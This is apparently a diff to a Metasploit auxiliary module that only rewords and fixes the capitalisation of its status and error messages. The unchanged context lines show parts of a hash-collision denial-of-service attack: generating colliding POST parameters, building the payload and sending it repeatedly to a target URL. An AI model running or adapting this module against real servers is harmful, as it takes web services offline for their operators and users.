@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 		post = ""
 		maxvaluefloat = size ** length
 		maxvalueint = maxvaluefloat.floor
-		print_status("Generating POST Data...")
+		print_status("Generating POST data...")
 		for i in 0.upto(maxvalueint)
 			inputstring = i.to_s(size)
 			result = inputstring.rjust(length, "0")
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def compute_collision_chars
-		print_status("Trying to find Hashes...") if @recursivecounter == 1
+		print_status("Trying to find hashes...") if @recursivecounter == 1
 		hashes = {}
 		counter = 0
 		length = datastore['collisioncharlength']
@@ -133,10 +133,10 @@ class Metasploit3 < Msf::Auxiliary
 		if counter < datastore['collisionchars']
 			# Try it again
 			if @recursivecounter > datastore['recursivemax']
-				print_error("Not enought values found. Please start this script again")
+				print_error("Not enough values found. Please start this module again")
 				return nil
 			end
-			print_status("#{@recursivecounter}: Not enough values found. Trying it again...")
+			print_status("#{@recursivecounter}: Not enough values found. Trying again...")
 			@recursivecounter = @recursivecounter + 1
 			hashes = compute_collision_chars
 		else
@@ -189,7 +189,7 @@ class Metasploit3 < Msf::Auxiliary
 				raise RuntimeError, "Target #{datastore['TARGET']} not supported"
 		end
 
-		print_status("Generating Payload...")
+		print_status("Generating payload...")
 		payload = generate_payload
 		return if payload == nil
 		# trim to maximum payload size (in MB)
@@ -201,7 +201,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Payload generated")
 
 		for x in 1..datastore['RLIMIT']
-			print_status("Sending Request ##{x}...")
+			print_status("Sending request ##{x}...")
 			opts = {
 				'method'	=> 'POST',
 				'uri'		=> datastore['URL'],
